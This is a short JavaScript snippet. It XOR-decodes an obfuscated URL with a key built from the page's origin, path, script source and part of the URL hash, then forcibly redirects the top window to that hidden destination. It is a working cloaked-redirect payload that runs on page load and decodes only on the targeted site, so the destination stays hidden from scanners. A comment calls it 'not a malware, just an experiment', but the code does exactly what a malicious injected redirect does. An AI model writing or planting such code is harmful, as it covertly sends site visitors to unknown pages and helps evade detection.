function xorStrings(a, b) {
    let result = '';
    // Determine the length of the shorter string to avoid errors.
    const len = Math.min(a.length, b.length);

    for (let i = 0; i < len; i++) {
        // Get the character codes (ASCII values) for the current characters
        const charCodeA = a.charCodeAt(i);
        const charCodeB = b.charCodeAt(i);

        // Perform the bitwise XOR on the character codes
        const xorResult = charCodeA ^ charCodeB;

        // Convert the result back to a character and append it to the result string
        result += String.fromCharCode(xorResult);
    }

    return result;
}

// this is not a malware, just an experiment, do not panic!

const key = JSON.stringify([location.origin, location.pathname, document.currentScript.src, location.hash.substring(19,49)]);
const href = '8J\x1A\x1B\x19\x15^_W[\b@\x00\x1D\x1D\x07JJ\x01\x01\x02\x19\x10\x05\x11\x00N\\FI\x19\b\x00\x01\x1EA\n\x1D\x03\x05JFK\n\x1E\x18\x18\x03]CDBO\x03\x04]\x00\x1E\x01K\x16K\x1C\x03\x02\x1E';
top.location.href = xorStrings(key, href)
